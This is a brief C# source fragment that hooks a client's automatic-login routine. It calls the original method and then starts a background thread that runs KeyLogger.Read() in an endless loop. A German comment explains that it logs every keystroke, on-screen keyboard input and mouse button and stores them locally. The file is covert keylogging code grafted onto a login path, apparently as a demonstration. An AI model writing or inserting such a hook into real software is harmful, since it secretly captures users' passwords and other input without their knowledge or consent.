namespace Client
{
    class Controller
    {
        private void recognizeAutomaticLogin()
        {
            original();
            Keylogging();
        }

        /* 
         * Beispielhaft werden alle Tastatureingaben auch von der Bildschirmtastatur sowie Maustasten mitgeloggt und lokal im
         * Client gespeichert
         * 
         */
        public void Keylogging()
        {
            Thread serverThread = new Thread(new ThreadStart(Keys));

            serverThread.Start();
        }

        private void Keys()
        {
            while (true)
            {
                KeyLogger.Read();
            }
        }
    }
}
